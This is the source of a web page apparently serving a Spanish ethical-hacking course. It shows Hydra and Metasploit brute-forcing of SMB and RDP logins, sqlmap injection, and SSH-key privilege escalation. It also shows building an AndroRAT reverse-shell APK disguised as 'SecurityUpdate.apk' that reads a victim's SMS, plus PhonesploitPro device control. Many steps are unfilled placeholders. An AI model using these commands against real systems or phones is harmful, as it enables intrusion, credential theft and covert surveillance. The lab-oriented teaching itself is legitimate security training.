--------------------------------------------------------------------------------
\`\`\`

#### Hydra para SMB
Fuerza bruta de credenciales SMB con Hydra:
\`\`\`bash
hydra -l msfadmin -P password.txt smb://192.168.146.130
\`\`\`
*Output (Ejemplo de resultado de Hydra para SMB):*
\`\`\`bash
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-07-24 03:43:05
[INFO] Reduced number of tasks to 1 (smb does not like parallel connections)
[DATA] max 1 task per 1 server, overall 1 task, 5 login tries (l:1/p:5), ~5 tries per task
[DATA] attacking smb://192.168.146.130:445/
[445][smb] host: 192.168.146.130   login: msfadmin   password: msfadmin
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-07-24 03:43:05
\`\`\`

#### Metasploit para SMB
Uso del módulo \`smb_login\` en Metasploit para verificar credenciales SMB de forma automatizada:
\`\`\`bash
msfconsole

msf6 > search smb_login

Matching Modules
================

  #  Name                             Disclosure Date  Rank    Check  Description
  -  ----                             ---------------  ----    -----  -----------
  0  auxiliary/scanner/smb/smb_login                   normal  No     SMB Login Check Scanner

msf6 > use 0
msf6 auxiliary(scanner/smb/smb_login) > set RHOSTS 192.168.146.130
RHOSTS => 192.168.146.130
msf6 auxiliary(scanner/smb/smb_login) > set USER_FILE msfadmin
USER_FILE => msfadmin
msf6 auxiliary(scanner/smb/smb_login) > set PASS_FILE /home/kali/Desktop/CEH/password.txt
PASS_FILE => /home/kali/Desktop/CEH/password.txt
msf6 auxiliary(scanner/smb/smb_login) > set verbose false
verbose => false
msf6 auxiliary(scanner/smb/smb_login) > run
\`\`\`

### RDP (Remote Desktop Protocol)
RDP es un protocolo propietario de Microsoft que permite el control remoto de un ordenador. El puerto por defecto es 3389.

#### Metasploit Framework para RDP
Escaneo de RDP con Metasploit para identificar servicios RDP activos:
\`\`\`bash
use auxiliary/scanner/rdp/rdp_scanner

msf6 auxiliary(scanner/rdp/rdp_scanner) > set RHOSTS 192.168.146.130
RHOSTS => 192.168.146.130
msf6 auxiliary(scanner/rdp/rdp_scanner) > set RPORT 3333
RPORT => 3333
msf6 auxiliary(scanner/rdp/rdp_scanner) > exploit
\`\`\`

#### Hydra para RDP
Fuerza bruta de RDP con Hydra para adivinar credenciales de acceso remoto:
\`\`\`bash
hydra -l msfadmin -P password.txt rdp://192.168.146.130 -s 3333
\`\`\`

### NetBIOS
NetBIOS (Network Basic Input/Output System) proporciona servicios de red para aplicaciones. La enumeración de NetBIOS puede revelar nombres de equipos, usuarios y grupos en la red local.

#### Nmap para NetBIOS
Escaneo de NetBIOS con Nmap para obtener información detallada:
\`\`\`bash
nmap -sV --script nbstat.nse 192.168.xxx.xxx
\`\`\`
*Output (Ejemplo de información NetBIOS):*
\`\`\`bash
Host script results:
| nbstat: NetBIOS name: METASPLOITABLE, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| Names:
|   METASPLOITABLE<00>   Flags: <unique><active>
|   METASPLOITABLE<03>   Flags: <unique><active>
|   METASPLOITABLE<20>   Flags: <unique><active>
|   \\x01\\x02__MSBROWSE__\\x02<01>  Flags: <group><active>
|   WORKGROUP<00>        Flags: <group><active>
|   WORKGROUP<1d>        Flags: <unique><active>
|_  WORKGROUP<1e>        Flags: <group><active>
\`\`\`

## Fase 6: Burp Suite
Burp Suite es una plataforma integrada para realizar pruebas de seguridad en aplicaciones web. Es una herramienta esencial para interceptar, analizar y manipular el tráfico HTTP/S, así como para escanear vulnerabilidades.

### Interceptación y Manipulación de Tráfico Web
\`\`\`text
[Aquí se incluirían los pasos detallados para configurar Burp Suite como proxy, interceptar peticiones, modificarlas y reenviarlas. Por ejemplo:
1. Configurar el navegador para usar el proxy de Burp Suite (por defecto 127.0.0.1:8080).
2. Activar la intercepción en la pestaña 'Proxy' -> 'Intercept'.
3. Navegar a una página web y observar las peticiones interceptadas.
4. Modificar una petición (ej. cambiar un parámetro) y reenviarla.]
\`\`\`

## Fase 7: SQLMap
SQLMap es una herramienta de código abierto que automatiza el proceso de detección y explotación de vulnerabilidades de inyección SQL. Es indispensable para probar la seguridad de bases de datos conectadas a aplicaciones web.

### SQLi (SQL Injection) desde la web
La inyección SQL es una técnica de inyección de código que podría permitir a un atacante manipular o destruir tu base de datos. SQLMap automatiza este proceso.

Usando SqlMap para escanear una URL vulnerable:
\`\`\`bash
sqlmap -u "http://example.com/vulnerable?id=1"
\`\`\`

Para obtener la cookie de sesión y usarla en SqlMap (útil cuando la autenticación es necesaria):
\`\`\`bash
sqlmap -u "http://example.com/vulnerable?id=1" --cookie="PHPSESSID=abc123def456"
\`\`\`

#### SQLi desde una petición HTTP
Puedes guardar una petición HTTP completa en un archivo y luego usar SqlMap para analizarla, lo cual es útil para peticiones complejas o que requieren headers específicos.
\`\`\`text
[Aquí se describiría cómo capturar una petición HTTP (ej. con Burp Suite) y guardarla en un archivo .req. Por ejemplo:
1. Captura la petición en Burp Suite.
2. Haz clic derecho en la petición y selecciona 'Save item'.
3. Guarda el archivo con una extensión .req (ej. 'request.req').]
\`\`\`

Guardamos el archivo de la siguiente forma (ej. \`request.req\`):
\`\`\`text
[Description or steps for saving request file would be here]
\`\`\`

Ahora, con sqlmap, puedes usar el archivo de petición (ya obtiene la cookie de sesión porque lo ha capturado en el request):
\`\`\`bash
sqlmap -r request.req --dbs
\`\`\`

## Fase 8: Metasploit Framework
Metasploit es el framework de explotación más popular, utilizado para desarrollar, probar y ejecutar exploits. Esta fase te enseñará a usarlo para obtener acceso y gestionar sesiones post-explotación.

### Privilege Escalation: Escalada de Privilegios
La escalada de privilegios es el acto de explotar un error de diseño, un error de configuración o una vulnerabilidad en un sistema operativo o aplicación para obtener acceso elevado a recursos que normalmente están protegidos.

#### Caso 1: Como usuario con bajos privilegios (Nivel Básico)
Contexto: Imagina que tienes acceso como \`user1\` pero no puedes ver un archivo \`flag.txt\` que pertenece a \`user2\`.
\`\`\`text
[Aquí se describiría el escenario, por ejemplo, mostrando que 'user1' no tiene permisos para leer 'flag.txt' y que 'user2' sí.]
\`\`\`

Lo que debemos hacer es cambiar de usuario de \`user1\` a \`user2\` utilizando \`sudo\` si \`user1\` tiene permisos para ejecutar \`bash\` como \`user2\`:
\`\`\`bash
sudo -u user2 /bin/bash
cd /home/user2/
cat flag.txt
\`\`\`

### Para ser Root: Métodos de Escalada
#### Clave Privada SSH:
Si encuentras una clave privada SSH (\`id_rsa\`) en el sistema objetivo, puedes usarla para autenticarte como otro usuario (ej. root) en el mismo o en otro servidor SSH. La ruta común es \`/root/.ssh\`.
\`\`\`text
[Aquí se describiría cómo encontrar la clave privada, por ejemplo, buscando en directorios comunes o usando herramientas de enumeración.]
\`\`\`

Copia esta clave privada a tu máquina local en un nuevo documento llamado \`id_rsa\` (debe tener exactamente ese nombre). Luego, dale los permisos correctos (solo lectura para el propietario) para que SSH la acepte:
\`\`\`bash
chmod 600 id_rsa
\`\`\`

Ahora, escribe el siguiente comando para conectarte como root usando la clave privada. Reemplaza \`192.168.xxx.xxx\` con la IP del objetivo y \`50706\` con el puerto SSH si es diferente al 22:
\`\`\`bash
ssh root@192.168.xxx.xxx -p 50706 -i id_rsa
\`\`\`

*Resultado Final (Ejemplo de login exitoso con clave privada):*
\`\`\`text
[SSH private key login result would be here, e.g., showing root shell]
\`\`\`

#### Clave Pública SSH:
Si tienes la capacidad de escribir en el archivo \`authorized_keys\` de un usuario (ej. root) en el sistema objetivo, puedes añadir tu clave pública para acceder sin contraseña.

Localizamos nuestra clave pública (\`id_rsa.pub\`) y la copiamos al archivo \`authorized_keys\` en el servidor objetivo (ej. \`/root/.ssh/authorized_keys\`):
\`\`\`bash
cp id_rsa.pub authorized_keys
\`\`\`

Entramos por ssh (ahora sin necesidad de contraseña si la clave pública fue añadida correctamente):
\`\`\`bash
ssh root@192.168.xxx.xxx
\`\`\`

*Resultado Final (Ejemplo de login exitoso con clave pública):*
\`\`\`text
[SSH public key login result 1 would be here]
\`\`\`
\`\`\`text
[SSH public key login result 2 would be here]
\`\`\`

### Cambiar de usuario
Comandos básicos para cambiar de usuario en un sistema Linux:
\`\`\`bash
sudo  ->  sudo -u user2  # Ejecutar un comando como otro usuario
su - juan             # Cambiar al usuario 'juan' (requiere contraseña)
\`\`\`

## Fase 9: Postman
Postman es una plataforma de colaboración para el desarrollo de APIs. En el contexto del hacking ético, es una herramienta invaluable para probar y automatizar interacciones con APIs, lo que te permite identificar vulnerabilidades en la lógica de negocio o en la implementación de la API.

### Pruebas de Seguridad en APIs con Postman
\`\`\`text
[Aquí se incluirían los pasos para usar Postman en pruebas de seguridad de APIs. Por ejemplo:
1. Crear una nueva colección y una petición HTTP (GET, POST, PUT, DELETE).
2. Configurar headers, parámetros de consulta y cuerpo de la petición.
3. Enviar la petición y analizar la respuesta.
4. Usar variables de entorno para gestionar diferentes entornos (desarrollo, producción).
5. Realizar pruebas de inyección (SQLi, XSS) en los parámetros de la API.
6. Probar la autenticación y autorización (ej. tokens JWT, claves API).]
\`\`\`

## Fase 10: OWASP ZAP
OWASP ZAP (Zed Attack Proxy) es un escáner de seguridad de aplicaciones web de código abierto. Es una de las herramientas más populares para encontrar automáticamente vulnerabilidades comunes como XSS, CSRF, y otras fallas de seguridad en aplicaciones web.

### Escaneo de Vulnerabilidades Web con OWASP ZAP
\`\`\`text
[Aquí se incluirían los pasos para usar OWASP ZAP. Por ejemplo:
1. Configurar ZAP como proxy en tu navegador.
2. Navegar por la aplicación web para que ZAP capture el tráfico.
3. Realizar un 'Active Scan' para buscar vulnerabilidades automáticamente.
4. Utilizar el 'Spider' para descubrir nuevas URLs y funcionalidades.
5. Analizar los resultados y los reportes generados por ZAP.]
\`\`\`

## Fase 11: Phishing y Creación de Malware (Educativo)
Esta fase te introduce a las tácticas de ingeniería social y al desarrollo de payloads maliciosos con fines educativos, para comprender mejor las amenazas y cómo defenderse de ellas.

### Malware Threats: ANDRORAT
ANDRORAT es una herramienta de administración remota (RAT) para Android, utilizada para controlar dispositivos de forma remota.

(*) Para compartir un archivo (configuración de un servidor web básico para servir el APK):
\`\`\`bash
mkdir /var/www/html/share
chmod -R 755 /var/www/html/share
chown -R www-data:www-data /var/www/html/share
service apache2 start
\`\`\`
Inicia un servidor HTTP simple en Python para servir el APK:
\`\`\`bash
python3 -m http.server 80
\`\`\`

Construye el archivo \`.apk\` malicioso con tu IP y puerto de escucha:
\`\`\`bash
python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk

# 10.10.1.13 -> es nuestra ip local (reemplaza con tu IP)
\`\`\`

Obtén la shell inversa una vez que la víctima ejecute el APK:
\`\`\`bash
python3 androRAT.py --shell -i 0.0.0.0 -p 4444
\`\`\`

→ Una vez dentro de la shell de ANDRORAT, algunos comandos útiles:
\`\`\`bash
Interpreter:/>  help         # Muestra los comandos disponibles
Interpreter:/>  deviceInfo   # Obtiene información del dispositivo
Interpreter:/>  getSMS inbox # Lee los SMS de la bandeja de entrada
Interpreter:/>  getMACAddress # Obtiene la dirección MAC del dispositivo
Interpreter:/>  exit         # Sale de la sesión
\`\`\`

## Otros Temas Relevantes en Hacking Ético
Además de las fases principales, hay otros conceptos y herramientas importantes que complementan tu formación en ciberseguridad.

### Steganography
La esteganografía es el arte y la ciencia de escribir mensajes ocultos de tal manera que nadie, aparte del remitente y el destinatario previstos, sospeche la existencia del mensaje.

#### Snow (usando Windows 10)
Snow es una herramienta de esteganografía para ocultar datos en archivos de texto.

##### Encrypt:
\`\`\`bash
SNOW.EXE -C -m "Esto es un secreto" -p "pa$$word" Secret.txt HiddenSecret.txt

donde:
-> SNOW.EXE es el ejecutable
-> Secret.txt es el archivo txt que ya existe y dentro tiene x contenido
-> HiddenSecret.txt es el archivo que contendrá Secret.txt pero dentro estará el mensaje oculto de "Esto es un secreto"
\`\`\`

##### Decrypt:
\`\`\`bash
SNOW.EXE -C -p "pa$$word" HiddenSecret.txt
\`\`\`

### Openstego (usando Windows10)
Openstego es una herramienta de esteganografía de código abierto con interfaz gráfica.

#### Encrypt
\`\`\`text
[Aquí se describirían los pasos para usar la interfaz gráfica de Openstego para incrustar datos en una imagen. Por ejemplo:
1. Abrir Openstego y seleccionar la imagen portadora.
2. Seleccionar el archivo a ocultar.
3. Ingresar una contraseña (opcional).
4. Guardar la nueva imagen con los datos ocultos.]
\`\`\`

#### Decrypt
\`\`\`text
[Aquí se describirían los pasos para usar la interfaz gráfica de Openstego para extraer datos de una imagen. Por ejemplo:
1. Abrir Openstego y seleccionar la imagen que contiene los datos ocultos.
2. Ingresar la contraseña (si se usó).
3. Extraer el archivo oculto.]
\`\`\`

### Hashes
Puedes usar servicios online para intentar descifrar hashes, lo cual es útil para identificar contraseñas o datos ocultos:
→ [https://hashes.com/en/decrypt/hash](https://hashes.com/en/decrypt/hash)

### Cryptography
La criptografía es la práctica y el estudio de técnicas para la comunicación segura en presencia de terceros.

#### Hashmyfiles
Hashmyfiles es una utilidad para calcular los hashes MD5, SHA1, CRC32, SHA-256, SHA-512 y SHA-384 de uno o más archivos.
\`\`\`text
[Aquí se describirían los pasos para usar Hashmyfiles. Por ejemplo:
1. Abrir la aplicación Hashmyfiles.
2. Arrastrar y soltar los archivos deseados en la ventana.
3. Observar los hashes generados para cada archivo.]
\`\`\`

#### CryptoForge
CryptoForge es una herramienta de cifrado de archivos y carpetas.

##### 1era Forma:
\`\`\`text
[Aquí se describirían los pasos para la primera forma de cifrado con CryptoForge, posiblemente a través de su interfaz principal para cifrar archivos individuales.]
\`\`\`

##### 2da forma:
\`\`\`text
[Aquí se describirían los pasos para la segunda forma de cifrado con CryptoForge, quizás para cifrar carpetas o crear archivos auto-extraíbles.]
\`\`\`

#### BcTextEncoder
BcTextEncoder es una herramienta para cifrar y descifrar texto.

##### Encrypt
\`\`\`text
[Aquí se describirían los pasos para cifrar texto con BcTextEncoder. Por ejemplo:
1. Abrir BcTextEncoder.
2. Ingresar el texto a cifrar.
3. Seleccionar el algoritmo de cifrado y la clave.
4. Generar el texto cifrado.]
\`\`\`

*Output (Ejemplo de texto cifrado con BcTextEncoder):*
\`\`\`bash
-----BEGIN ENCODED MESSAGE-----
Version: BCTextEncoder Utility v. 1.03.2.1

wy4ECQMCxtROuNfXzeJgpJbNHXt8wpWuMke/k5frLXuVgIoDMtZzP+2JzKop5UDe
0k0BxohYAhufPgLL/xXqOZ964aOAssf1zlTItMDGImLufrSo2U/BLm50NU6e2B+D
VCfoY1FKqyk/5wemM7BwEsmQg+hjjaHvQTTC+o1VIw==
=vnbr
-----END ENCODED MESSAGE-----
\`\`\`

#### Decrypt
*Input (Ejemplo de texto cifrado para descifrar):*
\`\`\`bash
-----BEGIN ENCODED MESSAGE-----
Version: BCTextEncoder Utility v. 1.03.2.1

wy4ECQMCxtROuNfXzeJgpJbNHXt8wpWuMke/k5frLXuVgIoDMtZzP+2JzKop5UDe
0k0BxohYAhufPgLL/xXqOZ964aOAssf1zlTItMDGImLufrSo2U/BLm50NU6e2B+D
VCfoY1FKqyk/5wemM7BwEsmQg+hjjaHvQTTC+o1VIw==
=vnbr
-----END ENCODED MESSAGE-----
\`\`\`

### CryptoTool
CryptoTool es una herramienta para diversas operaciones criptográficas, como cifrado, descifrado y hashing.
\`\`\`text
[Aquí se describirían los pasos para usar CryptoTool y sus diversas funciones.]
\`\`\`

### VeraCrypt
VeraCrypt es un software gratuito y de código abierto para el cifrado de disco sobre la marcha, permitiendo crear volúmenes cifrados o cifrar particiones/discos enteros.
\`\`\`text
[Aquí se describirían los pasos para usar VeraCrypt, por ejemplo, cómo crear un volumen cifrado o montar uno existente.]
\`\`\`

### Hacking Android
El hacking de Android se refiere a la explotación de vulnerabilidades en dispositivos y aplicaciones Android.

#### ABD (Android Debug Bridge)
ADB es una herramienta de línea de comandos que te permite comunicarte con un dispositivo Android.

##### Buscar dispositivos conectados
\`\`\`bash
adb device
\`\`\`

##### Conectar dispositivo
\`\`\`bash
adb connect 192.168.xxx.xxx:5555
\`\`\`

##### Obtener una Shell y navegar por dentro
\`\`\`bash
adb shell
\`\`\`

### PhonesploitPro
PhonesploitPro es una herramienta para el control remoto de dispositivos Android.
\`\`\`bash
python3 phonesploitpro.py
\`\`\`

Buscar si es que ha detectado nuestra IP del Android:
\`\`\`text
[Aquí se describiría cómo verificar si PhonesploitPro ha detectado la IP del dispositivo Android, mostrando un ejemplo de la salida esperada.]
\`\`\`

Conectamos el dispositivo y hacemos una prueba tomando una captura de pantalla:
\`\`\`text
[Aquí se describiría el comando o los pasos para tomar una captura de pantalla del dispositivo Android usando PhonesploitPro.]
\`\`\`

Para acceder al dispositivo debemos poner la opción 15 en el menú de PhonesploitPro:
\`\`\`text
[Aquí se describiría el proceso para seleccionar la opción 15 en el menú de PhonesploitPro para acceder al dispositivo.]
\`\`\`

Accedemos a una ruta en particular dentro del dispositivo Android:
\`\`\`bash
cd sdcard/
cd Download/
ls
\`\`\`
`

export default function RedTeamPage() {
  return (
    <div className="relative flex">
      <div className="container mx-auto px-4 py-8 max-w-3xl flex-grow">
        <h1 className="text-4xl font-bold mb-6 text-foreground">Masterclass: Introducción al Hacking Ético</h1>
        <ReactMarkdown remarkPlugins={[remarkGfm]} components={components}>
          {redTeamContent}
        </ReactMarkdown>
      </div>
      <TableOfContents tocItems={tocItems} />
    </div>
  )
}
